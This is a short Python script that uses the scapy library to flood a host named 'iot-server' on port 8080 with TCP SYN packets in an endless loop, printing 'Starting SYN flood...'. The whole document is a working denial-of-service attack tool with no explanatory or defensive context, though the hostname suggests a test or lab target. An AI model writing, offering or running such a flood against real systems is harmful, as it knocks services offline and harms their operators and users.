from scapy.all import IP, TCP, send
import time

target_ip = "iot-server"
target_port = 8080

print("Starting SYN flood...")
while True:
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, verbose=False)
    time.sleep(0.01) 